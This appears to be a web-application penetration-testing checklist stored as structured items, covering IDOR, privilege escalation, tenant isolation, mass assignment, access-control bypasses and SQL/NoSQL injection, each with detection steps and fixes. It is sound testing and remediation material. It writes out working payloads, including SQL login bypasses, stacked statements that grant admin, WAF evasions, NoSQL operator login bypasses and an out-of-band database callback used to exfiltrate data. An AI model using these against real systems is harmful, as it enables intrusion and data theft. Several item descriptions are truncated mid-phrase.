items.how_to_fix: Set Cache-Control: no-store (and no-cache, must-revalidate) on authenticated/sensitive responses, use autocomplete=off on sensitive fields where appropriate, and ensure back-button after logout shows no cached data. VERIFY sensitive pages aren't cached and secrets aren't autofilled.

items.title: Assess remember-me token design
items.description: Predictable or non-revocable persistent tokens enable long-term account takeover.
items.how_to_find:
1) Enable 'remember me' and inspect the persistent cookie/token - decode it and check for predictable/forgeable structure (username:hash, base64 of user id, weak signature).
2) Analyze entropy (Burp Sequencer) and test tampering (change the user portion) to impersonate another user.
3) Test lifetime (how long valid?), whether it's HttpOnly/Secure, and whether it can be revoked server-side.
4) Predictable/forgeable/non-revocable long-lived token = ATO finding.
items.how_to_fix: Use a high-entropy random selector+validator token stored/hashed server-side (not user-derived), set HttpOnly+Secure+SameSite, expire it, rotate on use, and make it individually revocable. VERIFY the remember-me token is unpredictable, revocable, and can't be forged.

items.title: Verify persistent login is revoked on credential change
items.description: Remember-me tokens that survive a password reset undermine recovery from compromise.
items.how_to_fix: On password change/reset (and account compromise), invalidate all persistent/remember-me tokens and other sessions server-side, and notify the user. VERIFY a pre-change remember-me token is rejected after password reset.
items.how_to_find:
1) Log in with 'remember me' on browser A (capture the persistent token).
2) Change/reset the account password in browser B.
3) Return to browser A (or replay the old remember-me token) - if it still auto-logs-in, persistent login survived the credential change (a compromised token outlives recovery).
4) Token still valid after password reset = finding.

sections.title: Authorization — IDOR / Insecure Direct Object Reference

items.title: Sequential / predictable object identifiers
items.description: Auto-incrementing or otherwise predictable ids let an attacker walk the keyspace and read or modify other users’ objects.
items.how_to_find:
1) Log in as user A and find requests referencing an object by id (e.g. /api/orders/1005, ?invoice_id=1005).
2) Increment/decrement the id (1004, 1006, ...) - if you receive another user's data, it's IDOR. Automate with Burp Intruder over a numeric range.
3) Confirm with a second account (user B's id) to prove cross-tenant access.
4) Test both in URL and body/JSON params.
items.how_to_fix: Enforce per-object authorization server-side on every request (verify the current user owns/may access the referenced id) - never rely on unpredictability. Prefer scoping queries to the authenticated user (WHERE user_id = :me). VERIFY user A cannot access user B's object id.

items.title: UUID / GUID guessing and predictability
items.description: Non-random or version-1 UUIDs, or UUIDs leaked elsewhere in the app, defeat the assumption that an opaque id is unguessable.
items.how_to_find:
1) Collect UUIDs used as object references and check their version: v1 UUIDs embed a timestamp+MAC (predictable), sequential/low-entropy values are guessable (analyze with Burp Sequencer).
2) Hunt for UUIDs LEAKED elsewhere (list endpoints, search results, notifications, other users' pages) - once you have a victim's UUID, use it against object endpoints.
3) If access works with a guessed/leaked UUID, it's still IDOR (opacity != authorization).
items.how_to_fix: Don't treat unguessable ids as an access-control mechanism - always authorize per object server-side. Use random v4 UUIDs, and stop leaking other users' identifiers in responses. VERIFY a valid-but-foreign UUID is rejected.

items.title: Mass IDOR / bulk object enumeration
items.description: List, export, or batch endpoints may apply weaker authorization than single-object endpoints, enabling bulk harvesting of foreign records.
items.how_to_fix: Apply the SAME per-object/tenant authorization to list/export/batch endpoints as to single-object ones; scope queries to the authenticated user, validate every id in a batch, and rate-limit/monitor bulk access. VERIFY list/export endpoints only return the caller's own records.
items.how_to_find:
1) Test list/search/export/batch endpoints (e.g. /api/export?ids=1,2,3, GET /api/users?all=true) which often authorize more weakly than single-object GETs.
2) Request a broad range or omit tenant filters and see if you get OTHER users' records in bulk.
3) Try batch/GraphQL queries pulling many objects by id at once.
4) Any foreign records returned in bulk = mass IDOR (large-scale data exposure).

items.title: IDOR in nested / related objects
items.description: Authorization checked on a parent object but not on nested children (e.g.
items.how_to_find:
1) Find endpoints with nested references, e.g. /api/orders/{myOrder}/items/{itemId} or /projects/{mine}/documents/{docId}.
2) Keep the PARENT id you own but swap the CHILD id to one belonging to another user/parent - apps often authorize the parent and trust the child.
3) Also mix: your parent + victim's child, or victim's parent + your child.
4) Access/modification of a foreign nested object = IDOR.
items.how_to_fix: Authorize every object in the chain and verify the child actually belongs to the authorized parent/user (e.g. WHERE item.order_id = :order AND order.user_id = :me). VERIFY a foreign child id under an owned parent is rejected.

items.title: Blind IDOR via observable side effects
items.description: Even when a response body is generic, side effects (emails, notifications, timing, state changes) can confirm unauthorized object access or mutation.
items.how_to_fix: Enforce per-object authorization on ALL actions, including those with generic responses; return a consistent 404/403 for unauthorized ids and don't perform the side effect. VERIFY actions on foreign ids produce no state change/notification.
items.how_to_find:
1) For actions with generic/empty responses (e.g. 'resend email', 'share', 'cancel'), swap the object id to a victim's even though the body doesn't reveal data.
2) Confirm impact via SIDE EFFECTS: did the victim get an email/notification, did their record change, did response TIMING/status differ (200 vs 404) between owned and foreign ids?
3) Use Burp Collaborator / a second account to observe effects.
4) A confirmed side effect on a foreign object = blind IDOR.

items.title: IDOR on write operations (PUT / PATCH / DELETE)
items.description: Read endpoints may be authorized correctly while the corresponding write/delete endpoints are not, allowing tampering with or destruction of foreign objects.
items.how_to_fix: Apply per-object authorization to write/delete handlers, not just reads; check ownership before mutating and reject foreign ids (return 403/404). Don't assume a read-guarded id is safe to write. VERIFY user A cannot PUT/PATCH/DELETE user B's object.
items.how_to_find:
1) Even if GET is properly authorized, test the WRITE endpoints on the same object: PUT/PATCH/DELETE /api/resource/{victimId} (and method override X-HTTP-Method-Override).
2) Try modifying a foreign object's fields or deleting it as user A.
3) Change the id in the body/JSON as well as the URL.
4) A successful modification/deletion of another user's object = write IDOR (integrity impact).

items.title: GUID / identifier leakage in responses
items.description: APIs that return other users’ GUIDs, internal ids, or object keys in unrelated responses hand an attacker the references needed for IDOR.
items.how_to_find:
1) Inspect API responses (JSON, HTML, JS bundles, error messages) for OTHER users' identifiers: GUIDs, internal DB ids, object keys, account numbers embedded in unrelated data (e.g. a comments feed exposing author user_ids).
2) Harvest those references, then feed them to object endpoints to test IDOR.
3) Note over-fetching (API returns more fields than the UI shows).
4) Leaked foreign references = the enabler for IDOR/enumeration.
items.how_to_fix: Return only the identifiers/fields the caller needs (avoid over-fetching), don't expose other users' internal ids, and - regardless - authorize per object so a leaked id is still useless. VERIFY responses don't disclose foreign identifiers.

items.title: Accessing admin functions as a standard user
items.description: Administrative actions exposed without a server-side privilege check let any authenticated user perform privileged operations.
items.how_to_find:
1) As an ADMIN, map the admin actions/endpoints (e.g. POST /admin/users, /api/admin/*).
2) Log in as a STANDARD user and replay those exact requests with the low-priv session/token (Burp Repeater).
3) If the privileged action succeeds, there's no server-side role check (vertical priv-esc).
4) Try both the API and any admin UI routes.
items.how_to_fix: Enforce role/permission checks server-side on every privileged function (not just at the UI/gateway); deny by default and check the authenticated user's role for each action. VERIFY a standard user's request to admin functions returns 403.

items.title: Forced browsing to privileged endpoints
items.description: Privileged pages and APIs merely hidden from the UI (e.g.
items.how_to_find:
1) Discover privileged URLs not linked in the low-priv UI: crawl JS bundles, sitemaps, and brute-force with ffuf/dirsearch using admin wordlists (/admin, /dashboard, /internal, /api/admin/...).
2) As a standard/unauthenticated user, request them directly - if they render/act instead of returning 403, access relies on obscurity (forced browsing).
3) Test HTTP methods and API equivalents too.
4) Any reachable privileged page/endpoint = finding.
items.how_to_fix: Protect every privileged route with a server-side authorization check (deny by default); hiding links is not access control. VERIFY directly requesting privileged endpoints as a low-priv user returns 403.

items.title: Parameter-based role escalation
items.description: Trusting a client-supplied role/level parameter (e.g.
items.how_to_find:
1) Look for role/privilege fields in requests or responses: role=user, isAdmin=false, level=1, group_id, in body/JSON/cookies/JWT.
2) Tamper them (role=admin, isAdmin=true, level=99) on register/profile-update/action requests and resend.
3) Also try mass-assignment: add these fields even if the UI doesn't send them.
4) If the server honors the client-supplied role, you escalate privileges.
items.how_to_fix: Never trust client-supplied role/privilege values - derive authorization from the server-side session/account, and block mass-assignment of privilege fields (allow-list bindable fields). VERIFY tampering role/isAdmin parameters doesn't change privileges.

items.title: Hidden admin parameters and feature flags
items.description: Undocumented query/body parameters (e.g. Good hygiene that pays off over time.
items.how_to_find:
1) Hunt for undocumented params that toggle privilege/behavior: debug=true, admin=1, test=true, feature flags, ?impersonate=, via param-mining (Burp Param Miner, Arjun) and by reading JS.
2) Add them to requests and observe whether they unlock admin behavior, verbose output, or bypass checks.
3) Check both query and body/JSON and headers.
4) Any hidden param that grants privilege/behavior = finding.
items.how_to_fix: Remove debug/admin backdoor parameters from production, gate feature flags behind server-side authorization, and ignore unknown/privilege params. VERIFY hidden parameters don't alter authorization or expose admin behavior.

items.title: Accessing peer resources at the same privilege level
items.description: Same-role users should be isolated from one another; missing ownership checks let one user read or modify another’s data.
items.how_to_fix: Enforce ownership checks on every resource access/mutation (scope queries to the authenticated user), not just role checks; same-role users must be isolated. VERIFY user A cannot read/modify user B's resources.
items.how_to_find:
1) Create two accounts of the SAME role (user A, user B).
2) As A, capture requests to your own resources (profile, orders, messages), then swap identifiers/ids to B's and replay with A's session.
3) If you read or modify B's data, ownership isn't enforced (horizontal priv-esc).
4) Test across profile, files, messages, settings, and API endpoints.

items.title: Tenant / account id swapping
items.description: Account or tenant identifiers carried in paths, headers, or bodies that are not bound to the session enable cross-account access.
items.how_to_find:
1) Identify account/tenant identifiers carried in the path, headers (X-Account-Id, X-Tenant-Id), or body/JSON.
2) Swap them to another account/tenant's value while keeping your session, and resend.
3) If the app uses the client-supplied id instead of binding tenant to the session, you cross into another account (cross-account/tenant access).
4) Test all locations (URL, header, cookie, body).
items.how_to_fix: Derive account/tenant context from the authenticated session server-side and ignore client-supplied account/tenant ids (or validate they belong to the caller). VERIFY swapping the account/tenant id doesn't grant cross-account access.

items.title: Email / username pivot
items.description: Endpoints that act on a user identified by an email/username parameter rather than by session allow takeover of arbitrary accounts.
items.how_to_fix: Act only on the user identified by the authenticated session, not on an email/username parameter; if a target must be specified, verify the caller is authorized for it. VERIFY changing the email/username parameter doesn't affect another account.
items.how_to_find:
1) Find endpoints that take an email/username parameter to identify the target user (e.g. change-email, reset, profile, delete: ?email=me@x.com).
2) Change it to a VICTIM's email/username and resend with your session - if the action applies to the victim's account, the endpoint trusts the parameter over the session (account takeover).
3) Test change-password/change-email/close-account flows especially.
4) Any action landing on the victim = finding.

items.title: Missing function-level access control
items.description: Each privileged function must be checked server-side; relying on menu hiding or a single gateway check leaves functions reachable.
items.how_to_fix: Enforce an authorization check on EVERY privileged function server-side (deny by default), not just a single gateway or menu-hiding; centralize checks and verify per-action. VERIFY each privileged function rejects users lacking the specific permission.
items.how_to_find:
1) Enumerate all privileged functions/endpoints (from the admin role and JS).
2) As a lower-privileged user, hit each one directly - some apps guard the entry page but not every underlying function/API.
3) Look for functions reachable despite the menu being hidden, or guarded by one check but not per-action.
4) Any privileged function executable by an unauthorized role = finding.

items.title: Client-side-only enforcement
items.description: Hiding or disabling controls in JavaScript without a matching server check means the underlying API is fully accessible.
items.how_to_fix: Perform all authorization server-side; client-side hiding/disabling is cosmetic only. Every API must independently verify the caller's permissions. VERIFY the underlying API rejects unauthorized calls even when the UI control is removed.
items.how_to_find:
1) Find UI controls that are hidden/disabled/grayed-out for your role (buttons, menu items).
2) In DevTools, re-enable them or read the JS to find the underlying API call, then invoke that API directly (Burp Repeater) with your session.
3) If the action succeeds, enforcement was client-side only.
4) Also intercept responses that carry data hidden by the UI (over-fetching).

items.title: Role confusion / overlapping permissions
items.description: Ambiguous or overlapping role definitions can grant unintended permissions, especially where multiple roles map to one identity.
items.how_to_fix: Define clear, least-privilege roles with unambiguous permission sets; when a user holds multiple roles, resolve to the intended (not the union of max) privileges and test edge combinations. VERIFY overlapping/multiple roles don't grant unintended permissions.
items.how_to_find:
1) Map each role's intended permissions, then test users that hold MULTIPLE roles or edge roles.
2) Look for actions permitted due to overlapping definitions (e.g. a 'support' role unexpectedly inheriting 'admin' rights, or role precedence granting the union of privileges).
3) Assign/switch roles and re-test each privileged action.
4) Any unintended permission from role overlap = finding.

items.title: Privilege persistence after downgrade
items.description: Tokens, sessions, or cached permissions issued before a role downgrade may continue to grant the old, higher privileges.
items.how_to_fix: Re-evaluate authorization from the live user record on each request (don't trust cached/token-embedded roles for long), and on role change invalidate existing sessions/tokens or bump a token version. VERIFY old sessions/tokens lose the higher privileges immediately after downgrade.
items.how_to_find:
1) Log in as a higher-privileged user (capture the session/JWT).
2) In another session, downgrade that user's role (or have an admin do it).
3) With the ORIGINAL token/session, retry a privileged action - if it still works, the old privileges persist (cached perms / role baked into a long-lived JWT).
4) Continued privileged access after downgrade = finding.

items.title: Cross-tenant data access
items.description: Queries that filter only by object id and not by tenant scope expose other tenants’ records.
items.how_to_find:
1) Register two tenants (Org A, Org B) with their own users and data.
2) As Org A, capture requests referencing objects by id and replay them with Org B's ids (URL, body, query) while keeping A's session.
3) If A can read/modify B's records, queries filter only by object id and not by tenant scope (cross-tenant leakage).
4) Test list/search/report endpoints too - they often lack tenant filtering.
items.how_to_fix: Scope every query by the authenticated user's tenant (WHERE tenant_id = :myTenant) and enforce tenant ownership on each object server-side; consider DB row-level security. VERIFY tenant A cannot access tenant B's data.

items.title: Tenant id tampering in JWT / headers
items.description: When tenant context comes from a client-supplied JWT claim or header, an attacker can edit it to impersonate another tenant.
items.how_to_find:
1) Identify where tenant context is carried: a JWT claim (tenant_id/org) or a header (X-Tenant-Id).
2) Edit it to another tenant's id and resend - for JWT, combine with signature attacks (alg=none, weak secret) if the token isn't verified; for headers, just change the value.
3) If the server trusts the client-supplied tenant, you access another tenant's data.
4) Any successful tenant switch via tampering = finding.
items.how_to_fix: Derive tenant context from a server-trusted source (validated session / properly-verified signed token), never from a mutable header; validate the tenant claim and that the user belongs to it. VERIFY tampering the tenant claim/header doesn't switch tenants.

items.title: Shared-cache cross-tenant leakage
items.description: Caches keyed without tenant context (CDN, app-level, or proxy) can serve one tenant’s data to another.
items.how_to_fix: Include tenant/user identity in cache keys (or mark tenant-specific responses private/no-store), and never cache authenticated per-tenant content in a shared/CDN cache without partitioning. VERIFY one tenant never receives another tenant's cached response.
items.how_to_find:
1) Identify cacheable responses that contain tenant-specific data (check Cache-Control, Age, X-Cache headers / CDN).
2) As tenant A, request a resource (populate the cache), then as tenant B (or unauthenticated) request the same URL - if you receive A's data, the cache key omits tenant context (web cache deception/poisoning across tenants).
3) Test static-looking paths and unkeyed query params.
4) Cross-tenant cached data = finding.

items.title: Setting privileged fields (isAdmin / role) via extra params
items.description: Frameworks that auto-bind request fields to models let an attacker include privileged attributes never shown in the UI.
items.how_to_find:
1) Capture a create/update request (e.g. register, profile update) and note the fields the UI sends.
2) Add privileged fields the UI never shows: isAdmin=true, role=admin, verified=true, balance=99999, user_id=<victim>.
3) Resend and check whether the server binds them (auto model-binding / over-posting).
4) If your role/attributes change, it's mass assignment. Read API docs/JS to discover more bindable field names.
items.how_to_fix: Bind only an explicit allow-list of user-settable fields (DTOs/strong-params/serializers), never the whole request onto the model; set privileged fields server-side only. VERIFY extra privileged fields in the request are ignored.

items.title: Nested object injection
items.description: Deep object graphs allow injecting privileged sub-objects (e.g.
items.how_to_fix: Allow-list bindable fields at every nesting level and don't auto-bind related/nested objects from user input; set relationships server-side after authorization. VERIFY injected nested/privileged sub-objects are ignored.
items.how_to_find:
1) In a JSON body, inject nested/related objects the UI doesn't send, e.g. {"name":"x","role":{"id":1,"name":"admin"}} or {"user":{"id":<victim>},"account":{"balance":99999}}.
2) Also try nested arrays/relationship ids (permissions, groups, owner) to bind privileged sub-objects via deep model graphs.
3) Resend and check whether the server persists the injected relationships.
4) Any bound privileged nested object = finding.

items.title: JSON vs form parameter smuggling
items.description: Switching content type (JSON, form-encoded, XML) can reach a different binder that applies weaker allow-listing of fields.
items.how_to_find:
1) Take a request the app protects and change its Content-Type to reach a different binder: form-encoded -> application/json (or XML), or vice versa.
2) Re-add the privileged fields (isAdmin, role) in the new format - a different parser/binder may allow-list fields more weakly.
3) Also try duplicate params across query+body, or JSON+form combined, to smuggle a value past validation.
4) If the alternate content type binds privileged fields, it's a bypass.
items.how_to_fix: Apply the same strict field allow-listing and validation across ALL content types/binders, reject unexpected content types, and normalize/deduplicate parameters. VERIFY switching content type doesn't bypass mass-assignment protection.

items.title: Unlinked / orphaned endpoints
items.description: Endpoints no longer linked in the UI (deprecated, debug, backup) often retain weak or no authorization.
items.how_to_find:
1) Discover endpoints not linked in the UI: read JS bundles/source maps, sitemap.xml, robots.txt, Wayback Machine, API docs/Swagger, and old versioned paths (/api/v1 when v2 is live).
2) Look for debug/backup/deprecated routes (/test, /old, /backup, .bak, /debug).
3) Request each directly - orphaned endpoints often kept weak/no auth.
4) Any reachable sensitive orphaned endpoint = finding.
items.how_to_fix: Inventory and decommission unused/deprecated/debug endpoints; apply the same authentication+authorization to every route (deny by default), including old API versions. VERIFY orphaned endpoints are removed or properly access-controlled.

items.title: Directory / endpoint guessing
items.description: Predictable path schemes and common directory names let an attacker brute-force their way to protected functionality.
items.how_to_fix: Enforce authorization on every path (deny by default) so guessing a URL never grants access; don't rely on obscurity, and disable directory listing. VERIFY brute-forced/guessed paths still require proper authorization.
items.how_to_find:
1) Brute-force paths/directories with ffuf/dirsearch/gobuster using wordlists (SecLists raft/common, plus tech-specific lists).
   ffuf -u https://target/FUZZ -w wordlist.txt -mc 200,301,302,403
2) Infer naming schemes from known paths and guess siblings (/admin, /api/users -> /api/admins).
3) Request discovered paths directly and check if protected functionality is reachable.
4) Any accessible sensitive path found by guessing = finding.

items.title: HTTP method-based access bypass
items.description: Authorization enforced for GET/POST but not for HEAD, PUT, or other verbs allows the control to be bypassed by switching methods.
items.how_to_fix: Apply authorization independent of HTTP method (deny by default for all verbs), disable unused methods, and don't let HEAD/OPTIONS or method-override headers bypass checks. VERIFY every method on a protected route is authorized.
items.how_to_find:
1) Take a request blocked for your role (e.g. GET /admin -> 403) and retry with other verbs: HEAD, PUT, DELETE, PATCH, OPTIONS, or an arbitrary/unknown method.
2) Try method-override headers (X-HTTP-Method-Override, X-Method-Override) and case tricks (Get, pUt).
3) Some frameworks only guard specific verbs, so a different method reaches the handler unchecked.
4) Any method that bypasses the check = finding.

items.title: Case / encoding bypass of path ACLs
items.description: ACLs matching exact path strings can be bypassed with case changes, URL encoding, trailing slashes, or path normalization quirks.
items.how_to_fix: Canonicalize/normalize (decode, lowercase, collapse slashes) the path BEFORE authorization, and match on the normalized value; ensure the proxy ACL and app agree on the path. VERIFY case/encoding/slash variants of a protected path are all denied.
items.how_to_find:
1) For a path blocked by an ACL (e.g. /admin -> 403), try variants: case (/Admin, /ADMIN), URL-encoding (/%61dmin, double-encode /%2561dmin), trailing slash (/admin/), added segments (/admin/., /./admin), path params (/admin;/), or ../ normalization.
2) The gateway ACL may match the literal string while the backend normalizes differently, so a variant slips through.
3) Any variant that reaches the protected resource = bypass.

items.title: URL-override header access bypass
items.description: Reverse proxies and frameworks that honour X-Original-URL, X-Rewrite-URL, or X-Original-Path can route an allowed front-end path to a restricted back-end one, bypassing the gateway ACL.
items.how_to_fix: Don't honor client URL-override headers (X-Original-URL, X-Rewrite-URL, X-Original-Path) for routing/authorization; strip them at the edge and authorize on the true request path. VERIFY these headers can't reach a restricted path.
items.how_to_find:
1) Request an allowed path but add a URL-override header pointing to a restricted one:
   GET / HTTP/1.1 + X-Original-URL: /admin  (also try X-Rewrite-URL, X-Original-Path).
2) If the gateway authorizes '/' but the framework routes to /admin from the header, you bypass the ACL.
3) Combine with the encoding tricks above.
4) Reaching the restricted resource via the header = finding.

items.title: Referer-based access control
items.description: Apps that gate sensitive functionality on the Referer header (e.g.
items.how_to_fix: Never use the Referer header for access control (it's client-controlled and optional); enforce session/role checks server-side. VERIFY the resource is denied regardless of any Referer value.
items.how_to_find:
1) Access a sensitive page normally, then request it directly (no Referer) - if blocked, the app may gate on Referer.
2) Set Referer to a trusted internal value (e.g. https://target/admin) on a direct request to a protected action - if it now succeeds, access is Referer-gated.
3) Since Referer is fully attacker-controlled, this is trivially bypassable.
4) Access granted by forging Referer = finding.

items.title: Test for error-based SQL injection
items.description: Verbose database errors leak query structure and let an attacker extract data directly through error messages.
items.how_to_find:
1) Inject a single quote (') and SQL metacharacters into each parameter (query, body, JSON, headers, cookies) and watch for DB error strings in the response (SQL syntax, ORA-, PG::, SQLite...).
2) Use error-forcing payloads to extract data (MySQL: extractvalue(1,concat(0x7e,version())); MSSQL: CONVERT(int,@@version)).
3) Automate/confirm with sqlmap (sqlmap -u URL --batch).
4) DB errors or leaked data in the response = error-based SQLi.
items.how_to_fix: Use parameterized queries/prepared statements (bind variables) for all DB access, disable verbose DB errors in production (generic error pages), apply least-privilege DB accounts, and add a regression test for the vulnerable parameter. VERIFY the payload no longer alters the query or leaks errors.

items.title: Test for UNION-based SQL injection
items.description: UNION SELECT lets an attacker append a second result set, extracting arbitrary columns and tables in the HTTP response.
items.how_to_fix: Use parameterized queries/prepared statements everywhere and validate/allow-list any dynamic identifiers (columns, ORDER BY); apply least-privilege DB accounts. Add a regression test for the parameter. VERIFY UNION payloads no longer return extra data.
items.how_to_find:
1) Find the column count with ORDER BY N (increment until error) or UNION SELECT NULL,NULL,... until the page renders.
2) Identify which columns are reflected, then extract data: ' UNION SELECT NULL,version(),NULL-- , then table/column names from information_schema.
3) Match column data types (use NULL/CAST) for the UNION to succeed.
4) Automate with sqlmap --technique=U. Extra data in the response = UNION SQLi.

items.title: Test for blind boolean-based SQL injection
items.description: Even without visible output, differing responses to true/false conditions allow byte-by-byte data extraction.
items.how_to_fix: Use parameterized queries/prepared statements, return uniform responses, and apply least-privilege DB accounts; add a regression test. VERIFY true/false injected conditions produce identical responses.
items.how_to_find:
1) Inject conditions that are true vs false and compare the response (content/length/status):
   ' AND 1=1--  (normal)  vs  ' AND 1=2--  (different/empty).
2) A consistent difference = boolean-blind SQLi; then extract data bit-by-bit with SUBSTRING()/ASCII() conditions.
3) Automate with sqlmap --technique=B.
4) Observable true/false divergence = finding.

items.title: Test for blind time-based SQL injection
items.description: When no boolean difference is observable, deliberate time delays confirm injection and enable inference-based extraction.
items.how_to_fix: Use parameterized queries/prepared statements and least-privilege DB accounts; add a regression test for the parameter. VERIFY time-delay payloads no longer affect response time.
items.how_to_find:
1) Inject a conditional delay and measure response time:
   MySQL: ' AND SLEEP(5)--  ; MSSQL: '; WAITFOR DELAY '0:0:5'-- ; Postgres: ' AND (SELECT pg_sleep(5))-- .
2) If the response is consistently delayed only when the payload fires, it's time-based blind SQLi; extract data via conditional sleeps.
3) Confirm with sqlmap --technique=T.
4) Repeatable induced delay = finding.

items.title: Test for second-order SQL injection
items.description: Input stored safely in one request but later concatenated into a query elsewhere bypasses input-time filtering.
items.how_to_fix: Use parameterized queries at EVERY point data reaches the DB - including reads of previously stored input; never trust 'already stored' values. Add regression tests covering the store-then-use path. VERIFY stored payloads don't execute when later used.
items.how_to_find:
1) Store an SQL payload in a field that's saved safely now but used in a query LATER (e.g. set username to admin'--, then trigger a profile update/report that concatenates it).
2) Perform the secondary action and watch for errors/behavior changes there, not at input time.
3) Because input-time filtering is bypassed, test all stored values consumed elsewhere.
4) Injection firing on the second use = second-order SQLi.

items.title: Test for ORM injection
items.description: Raw query builders, string interpolation, or unsafe ORM filter parsing can reintroduce SQL injection despite an abstraction layer.
items.how_to_fix: Avoid raw/interpolated queries in the ORM; use bound parameters, don't pass user input into .raw()/.extra()/string filters, and validate/allow-list any dynamic fields or operators. Add a regression test. VERIFY ORM payloads don't reach the SQL layer.
items.how_to_find:
1) Identify ORM query builders that take user input into raw fragments, string filters, or field/operator names (e.g. Django .extra()/.raw(), Sequelize where with $ operators, Hibernate HQL string concat).
2) Inject SQL metacharacters/operators into those params and watch for errors or altered results.
3) Test ORDER BY/field-name params which ORMs often don't bind.
4) Any injection surviving the ORM = ORM injection.

items.title: Test WAF bypass and encoding for SQLi
items.description: WAFs frequently block obvious payloads but can be evaded with encoding, comments, and case/keyword tricks, leaving the underlying flaw exploitable.
items.how_to_fix: Fix the underlying SQLi with parameterized queries (don't rely on the WAF); treat the WAF as defense-in-depth only, and tune its rules. Add a regression test. VERIFY the injection fails even when WAF-evasion encodings are used.
items.how_to_find:
1) When obvious payloads are blocked, try evasions: inline comments (UN/**/ION SEL/**/ECT), case mixing (SeLeCt), URL/double-URL/hex/unicode encoding, whitespace alternatives (%09,%0a,/**/), and keyword substitutes.
2) Use sqlmap tamper scripts (--tamper=space2comment,charunicodeencode,...).
3) If an evasion reaches the DB (errors/delays/data), the flaw exists behind the WAF.
4) Any successful bypass = finding (report the real SQLi, not just the WAF).

items.title: Test for out-of-band SQL injection
items.description: When in-band channels are unavailable, triggering DNS or HTTP callbacks from the database confirms injection and exfiltrates data.
items.how_to_fix: Use parameterized queries, run the DB with least privilege, and block DB outbound network/DNS + risky functions (xp_dirtree, UTL_HTTP, LOAD_FILE with UNC). Add a regression test. VERIFY no OOB callback is triggered.
items.how_to_find:
1) When no in-band output/timing works, trigger a DB-initiated DNS/HTTP callback to Burp Collaborator:
   MSSQL: '; EXEC master..xp_dirtree '\\BURP-COLLAB\x'-- ; Oracle: UTL_HTTP/UTL_INADDR; MySQL: LOAD_FILE('\\BURP-COLLAB\x').
2) Watch Collaborator for the callback (confirms injection) and exfiltrate data via the subdomain.
3) Automate with sqlmap OOB.
4) Any DB callback = OOB SQLi.

items.title: Test for stacked query injection
items.description: Drivers that allow multiple statements per query enable INSERT/UPDATE/DROP and procedure execution beyond the original statement.
items.how_to_fix: Use parameterized queries, use DB drivers/APIs that don't allow multiple statements per call, and apply least-privilege (no DDL/procedure rights for the app). Add a regression test. VERIFY a stacked second statement doesn't execute.
items.how_to_find:
1) Append a second statement with a semicolon:
   '; INSERT INTO ...--  , '; UPDATE users SET role='admin'--  , '; WAITFOR DELAY '0:0:5'-- (to confirm on MSSQL).
2) Only some drivers (e.g. MSSQL/PostgreSQL via certain APIs) allow stacked queries - use a timed/observable second statement to confirm.
3) Check for state changes (new/modified rows) as proof.
4) A second statement executing = stacked-query SQLi.

items.title: Test for authentication bypass via SQLi
items.description: Injection in login queries can short-circuit credential checks and grant access without valid credentials.
items.how_to_fix: Use parameterized queries for the login lookup, never build auth queries by concatenation, verify password hashes in code (not in SQL), and apply least-privilege. Add a regression test. VERIFY injection payloads no longer log in.
items.how_to_find:
1) In the login username/password fields, inject classic bypass payloads:
   ' OR '1'='1'--  , admin'--  , ' OR 1=1 LIMIT 1-- .
2) If you're logged in (often as the first/admin user) without valid creds, the login query is injectable.
3) Also test the username to target a specific user: admin'-- .
4) Successful login via injection = auth-bypass SQLi (high impact).

items.title: Test for operator injection ($ne/$gt)
items.description: Passing query operators instead of scalar values lets an attacker alter MongoDB query semantics.
items.how_to_find:
1) Where the app expects a scalar (e.g. {"user":"bob"}), send a query operator instead: {"user":{"$ne":null}}, {"age":{"$gt":0}}.
2) In form-encoded requests use bracket notation: user[$ne]=null.
3) If results change (all records returned, filters bypassed), the input is placed into the query unsanitized.
4) Use NoSQLMap/manual payloads. Altered query behavior = operator injection.
items.how_to_fix: Cast/validate inputs to expected scalar types before querying, reject objects/operators where a string is expected (schema validation), and use a sanitizer (e.g. mongo-sanitize) to strip $-keys. Add a regression test. VERIFY operator objects are rejected.

items.title: Test for NoSQL authentication bypass
items.description: Operator injection in login queries can match any user and grant access without valid credentials.
items.how_to_fix: Validate/cast login inputs to strings, reject operator objects, and verify password hashes in application code (not in the query). Add a regression test. VERIFY operator-injection login attempts fail.
items.how_to_find:
1) In the login request, replace username/password with operators:
   JSON: {"user":{"$ne":null},"pass":{"$ne":null}}  or  {"user":"admin","pass":{"$gt":""}}.
   Form: user[$ne]=null&pass[$ne]=null.
2) If you log in without valid creds (matching the first/any user), the auth query is injectable.
3) Target a user with {"user":"admin","pass":{"$ne":"x"}}.
4) Successful login = NoSQL auth bypass.

items.title: Test for blind boolean NoSQL injection
